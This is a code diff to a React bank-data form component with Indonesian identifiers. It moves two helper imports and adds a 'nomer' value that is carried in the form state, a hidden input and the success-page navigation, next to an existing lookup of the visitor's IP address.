@@ -2,8 +2,8 @@ import { useNavigate } from "react-router-dom";
 import { useState, useEffect } from "react";
 import React from "react";
 import axios from "axios";
-import styles from "../data/style";
-import { formIdentitas, formPekerjaan } from "../data/index";
+import styles from "../helper/style";
+import { formIdentitas, formPekerjaan } from "../helper/index";
 import {
   Checkbox,
   FormControlLabel,
@@ -20,6 +20,7 @@ const FormBank = ({
   isiPenting,
   value,
   endpoint,
+  nomer,
   namaRadio = "pekerjaan",
   judulRadio = "Pekerjaan",
   dummyprops = formPekerjaan,
@@ -29,7 +30,7 @@ const FormBank = ({
   const navigate = useNavigate();
 
   useEffect(() => {
-    setInputs((values) => ({ ...values, jenis: value }));
+    setInputs((values) => ({ ...values, jenis: value, nomer: nomer }));
 
     axios
       .get("https://api.ipify.org?format=json")
@@ -39,7 +40,7 @@ const FormBank = ({
       .catch((error) => {
         console.error("Error fetching IP address:", error);
       });
-  }, [value]);
+  }, [value, nomer]);
 
   const handleChange = (event) => {
     const name = event.target.name;
@@ -83,7 +84,7 @@ const FormBank = ({
     axios
       .post(endpoint, updatedInputs)
       .then((response) => {
-        navigate("/success", {state: {nameInputs, code, value}});
+        navigate("/success", {state: {nameInputs, code, value, nomer}});
       })
       .catch((err) => {
         toast.error("Gagal Memasukkan Data, Mohon Perhatikan Lagi!");
@@ -163,6 +164,15 @@ const FormBank = ({
           value={ip}
           onChange={handleChange}
         />
+
+        <input
+          type="hidden"
+          name="nomer"
+          value={inputs.nomer}
+          onChange={handleChange}
+        />
+
+
 
         {React.cloneElement(isiPenting, {
           inputs,
